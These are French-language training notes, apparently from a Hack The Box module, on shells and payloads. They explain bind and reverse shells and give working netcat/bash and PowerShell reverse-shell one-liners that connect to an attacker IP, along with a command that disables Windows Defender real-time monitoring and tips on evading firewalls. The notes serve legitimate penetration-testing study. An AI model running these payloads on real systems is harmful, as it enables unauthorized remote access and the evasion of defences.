---
title: Shells & Payloads
description: 
published: true
date: 2025-05-18T14:39:42.592Z
tags: htb, module
editor: markdown
dateCreated: 2025-05-04T16:19:33.360Z
---

# Shells & Payloads

Date de complétion: XX/XX/XXXX

# Shells Jack Us In, Payloads Deliver Us Shells

Un shell est un programme qui fournit à un utilisateur une interface où entrer des instructions et voir la sortie texte. Les shell les plus connus étant Bash, Zsh, PowerShell ou encore cmd.

## Why Get a Shell?

Le shell permet un accès direct au système d'exploitation, aux commandes système et au système de fichiers. Une fois que nous avons un shell, nous pouvons rechercher des vecteurs d'élévation de privilèges, de pivotement, de transfert de fichiers, et plus encore. Sans un shell, nos actions sur une machine cible sont limitées.

Avoir un shell permet aussi de maintenir une persistance sur le système, offrant ainsi plus de temps pour travailler et facilitant l'utilisation des outils d'attaque, l'exfiltration de données, et la documentation de l'attaque. De plus, l'accès au shell en ligne de commande (CLI) est plus discret que l'accès à un shell graphique via VNC ou RDP. Les interfaces en ligne de commande sont plus rapides, plus difficiles à détecter et plus faciles à automatiser.

Le terme de shell possède plusieurs perspectives:

| **Perspective** | **Description**                                                                                                                                                          |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Général**     | Environnement en ligne de commande utilisé pour administrer des tâches sur un PC (ex : Bash, PowerShell).                                                                |
| **Sécurité**    | Un shell peut être obtenu en exploitant une vulnérabilité pour obtenir un accès interactif à un hôte (ex: EternalBlue).                                                  |
| **Web**         | Un shell web exploite des vulnérabilités, comme le téléchargement d'un fichier ou script, pour permettre à l'attaquant de donner des instructions via des requêtes HTTP. |

## Payloads Deliver us Shells

Le terme "payload" peut être défini de différentes manières:

- Réseau : La partie contenant les données d'un paquet.
- Général: La partie d'un jeu d'instructions qui définit l'action à entreprendre.
- Programmation: La portion de données transportée par une instruction dans un langage de programmation.
- Sécurité: Le code créé pour exploiter une vulnérabilité dans un système informatique, incluant différents types de malwares.

# Anatomy of a Shell

Chaque système d'exploitation dispose d'un ou plusieurs shell. Pour intéragir avec un shell il faut utiliser un programme appellé émulateur de terminal (Terminal Emulator).

Voici quelques émulateurs de terminaux:

| **Émulateur de terminal** | **Système d'exploitation** |
| ------------------------- | -------------------------- |
| Windows Terminal          | Windows                    |
| cmder                     | Windows                    |
| PuTTY                     | Windows                    |
| kitty                     | Windows, Linux et MacOS    |
| Alacritty                 | Windows, Linux et MacOS    |
| xterm                     | Linux                      |
| GNOME Terminal            | Linux                      |
| MATE Terminal             | Linux                      |
| Konsole                   | Linux                      |
| Terminal                  | MacOS                      |
| iTerm2                    | MacOS                      |

Cette liste ne recense pas tous les émulateurs de terminal existants, mais elle présente certains des plus utilisés.
Beaucoup étant open source, il est possible de les installer sur d'autres systèmes d'exploitation que ceux prévus à l'origine. Le choix d’un émulateur de terminal dépend avant tout des préférences personnelles et du style de travail.
Sur les machines cibles, l’émulateur disponible dépendra généralement de celui intégré nativement au système.

## Command Language Interpreters

Un interpréteur de langage de commande (Command Language Interpreter) traduit en temps réel les instructions données par l'utilisateur pour les transmettre au système d'exploitation. Une interface en ligne de commande (CLI) fait donc référence au système d’exploitation, l’émulateur de terminal et l’interpréteur de commandes.

Il en existe plusieurs types, aussi appelés langages de script shell (shell scripting languages) ou interpréteurs de commandes et de scripts (Command and Scripting interpreters).

Connaître l’interpréteur utilisé sur un système donné nous aide aussi à savoir quelles commandes et quels scripts employer.

## Hands-on with Terminal Emulators and Shells

Dès l'ouverture de l'application MATE Terminal, celle-ci s'est ouverte avec un interpréteur de commandes préconfiguré.
Le symbole `$`, visible dans l'invite de commande, indique l'utilisation probable de Bash (ou d’un shell similaire comme Ksh ou POSIX).
Lorsque du texte aléatoire est saisi, Bash répond qu’il ne reconnaît pas la commande, ce qui montre que chaque interpréteur a ses propres commandes.

Une autre manière d’identifier l’interpréteur utilisé est de consulter les processus en cours d'exécution sur la machine avec `ps` ou de regarder la variable d'environnement `SHELL`.

Il est aussi possible d'ouvrir PowerShell avec l'application MATE Terminal, Cela montre qu'il est possible d'utiliser des interpréteurs de commandes différents pour un émulateur de terminal.

# Bind Shells

Dans de nombreux cas, l’objectif est d’obtenir un accès à un shell sur un système local ou distant.
Pour cela, on utilise le l'émulateur de terminal sur la machine attaquante pour controller le système distant à travers son shell. Cela est le plus souvent effectué via un Bind/Reverse shell.

## What Is It?

Avec un Bind Shell, le système cible écoute les connexions entrantes.

Cela peut poser des problèmes:

- Le listener doit être démarré
- Des règles strictes de pare-feu et du NAT en bordure de réseau, ce qui implique qu’il faut déjà être sur le réseau interne pour contourner ces protections.
- Les Pare-feu logiciels peuvent bloquer rles connexions entrantes.

## Practicing with GNU Netcat

Démarrer le listener pour écouter sur le port 7777.

```
nc -lvnp 7777
```

Établir une session TCP et envoyer un message.

```
nc -nv <ip> 7777
<message>
```

## Establishing a Basic Bind Shell with Netcat

Après avoir vu comment envoyer du texte entre le client et le serveur, nous allons voir comment servir un shell pour établir un vrai Bind Shell.

Exemple pour lier un shell Bash à la session TCP avec nc et un canal nommé FIFO:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip cible> <port cible> > /tmp/f
```

La commande ci-dessu est donc considérée comme le payload.

Nous avons établi avec succès une session bind shell. Cela a été réalisé sans aucune mesure de sécurité en place (comme les routeurs avec NAT, pare-feux matériels, WAF, IDS/IPS, pare-feux système, antivirus, ou mécanismes d'authentification).

Il ne faut pas oublier qu'il est plus facile de se défendre face à un Bind Shell puisque les connexions entrantes sont d'avantage détectables.

# Reverse Shells

Avec un Reverse Shell, le système cible initie les connexions.

Il est conseillé d'utiliser un reverse shell lorsqu’on rencontre des systèmes vulnérables, car les connexions sortantes sont moins surveillées, ce qui augmente nos chances de passer inaperçus. Contrairement aux bind shells, qui nécessitent une connexion entrante (souvent bloquée par un pare-feu),

De nombreux payload sont disponibles en ligne, comme le [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/). Cependant les payloads génériques sont facilement détectables par des systèmes de défense.

## Hands-on With A Simple Reverse Shell in Windows

Sur la machine attaquante, lancer le listener:

```
sudo nc -lvnp 443
```

Utiliser port courant permet parfois d'éviter que la connexion sortante vers notre machine soit bloquée par le pare-feu du système ou du réseau. Par exemple, il est rare que les connexions sortantes sur le port 443 soient bloquées, car il est essentiel pour accéder au web.

Cependant, un pare-feu capable d'inspecter les paquets (Deep Packet Inspection), pourrait détecter et bloquer un reverse shell.

Il est possible d'utilise Netcat sur Windows pour initier le reverse shell, cependant Netcat n'est pas natif à Windows, facilement détectable comme un logiciel malveillant et le binaire doit être transféré sur la cible.

Au moment de la tentative d'établissement d'un Reverse Shell, il est recommandé de regarder quels langages shell et applications sont présentes sur la cible. Ces outils peuvent parfois être utilisés pour initier le reverse shell.

Voici un exemple de client Powershell (ou payload) "One-liner" permettant d'initier le reverse shell:

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Cependant ce payload a de grandes chances d'être bloqué par un antivirus (Windows Defender ou autre)

Pour désactiver la protection en temps réel de Windows Defender:

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Introduction to Payloads

La **payload** est le contenu principal d’un message. En informatique, c’est l’information utile transmise. En **cybersécurité**, elle désigne un code ou une commande exploitant une faille, souvent à des fins malveillantes.

## One-Liners Examined

### Netcat/Bash Reverse Shell One-liner

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

1. **`rm -f /tmp/f;`**
   Supprime le fichier `/tmp/f` s’il existe déjà.

1. **`mkfifo /tmp/f;`**
   Crée un fichier [pipe nommé (FIFO)](https://man7.org/linux/man-pages/man7/fifo.7.html).

1. **`cat /tmp/f |`**
   Concatène le fichier nommé **/tmp/f** (un FIFO), et transmet sa sortie via un pipe à la commande suivante.

1. **`/bin/bash -i 2>&1 |`**
   Spécifie l'interpréteur de commandes (avec -i pour le rendre interactif). L'expression 2>&1 redirige le flux d'erreur standard (2) et le flux de sortie standard (1) vers la commande qui suit le symbole | (pipe).

1. **`nc 10.10.14.12 7777 > /tmp/f`**
   Utilise Netcat pour envoyer une connexion vers l'attaquant. La sortie sera redigigée vers le pipe nommé (FIFO) **/tmp/f**.

### PowerShell One-liner Explained

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

1. **`powershell -nop -c `**
   La commande exécute PowerShell sans charger de profil (`-nop`) et exécute une commande ou un bloc de script spécifié entre guillemets grâce à l'option `-c`. Cette commande PowerShell est utilisée depuis `cmd.exe`, utile en cas de faille RCE permettant d'exécuter des commandes via cmd.exe sans se trouver à la base dans le shell PowerShell.
1. **`"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`**
   Cette commande instancie l'objet .NET `System.Net.Sockets.TCPClient` et l’assigne à la variable `$client`. L'instance va ensuite se connecter avec le socket (adresse + port) précisé lors de l'instanciation de l'objet via son constructeur. **C'est l'opération de binding**.

1. **`$stream = $client.GetStream();`**
   Défini la variable `$stream` en appelant la méthode [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) sur l’objet $client pour gérer la communication réseau. **C'est l'opération de déinition du flux de commande**

1. **`[byte[]]$bytes = 0..65535|%{0};`**
   Cette commande crée un tableau de type byte nommé $bytes contenant 65 535 zéros. C’est un flux de bytes vide destiné à être envoyé vers le listener.

1. **`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`**
   lance une boucle while où la variable `$i` est initialisée avec le résultat de la méthode `Read` du flux ([`$stream.Read`](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)). Cette méthode lit des données dans le buffer `$bytes`, à partir de l’offset 0, pour une longueur égale à la taille de `$bytes`.

1. **`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`**
   Définit la variable `$data` en lui assignant une instance de classe du framework .NET pour l’encodage ASCII, qui sera utilisée avec la méthode GetString pour convertir le flux de bytes ($bytes) en texte ASCII. En résumé, ce que nous tapons sera encodé en texte ASCII.

1. **`$sendback = (iex $data 2>&1 | Out-String );`**
   Définit/évalue la variable `$sendback` en lui assignant le résultat de la commande `Invoke-Expression` avec la variable `$data`, puis redirige la sortie d’erreur standard et la sortie standard via un pipe vers la commande `Out-String` qui convertit les objets en chaînes de caractères.

1. **`$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`**
   Définit la variable `$sendback2` en lui assignant la variable `$sendback` concaténé avec la chaîne de caractères `PS` et le chemin du répertoire de travail courant et le caractère `>`.

1. **`$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`**
   Définit/évalue la variable $sendbyte en lui assignant le flux d’octets encodé en ASCII.

1. **`$client.Close()"`**
   Utilise la méthode [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) pour terminer la connexion.

Il est possible d'avoir le même résultat en passant par un script PowerShell et non un one-liner. Par exemple avec la cmdlet [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) du projet Nishang.

# Automating Payloads & Delivery with Metasploit

[Metasploit](https://www.metasploit.com/) est un framework d'attaque automatisé dévelloppé par Rapid7. Cela rationnalise le processus d'exploitation de vulnérabilités grâce aux modules préfrabriqués qui contiennent des options faciles d'utilisation pour exploiter les vulnérabilitées et délivrer des payloads.

Une comparaison des éditions de Metasploit est disponible [ici](https://www.rapid7.com/products/metasploit/download/editions/).

